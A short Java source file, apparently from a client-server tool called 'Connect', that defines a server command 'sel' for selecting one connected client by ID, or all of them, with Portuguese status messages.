package br.com.introcdc.connect.server.commands.info;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:28
 */

import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.command.ServerCommand;

public class ServerCommandSelect extends ServerCommand {

    public ServerCommandSelect() {
        super("sel");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        try {
            if (command.split(" ")[1].equalsIgnoreCase("todos")) {
                ConnectServer.SELECTED_CLIENT = -1;
                msg("Todos os clientes selecionados!");
                return;
            }
            int id = Integer.parseInt(command.split(" ")[1]);
            if (!ConnectServer.CLIENTS.containsKey(id)) {
                msg("Cliente #" + id + " não encontrado");
                return;
            }
            ConnectServer.SELECTED_CLIENT = id;
            msg("Cliente " + ConnectServer.CLIENTS.get(id).getClientInfo() + " selecionado!");
        } catch (Exception ignored) {
            msg("Digite um ID correto!");
        }
    }

}
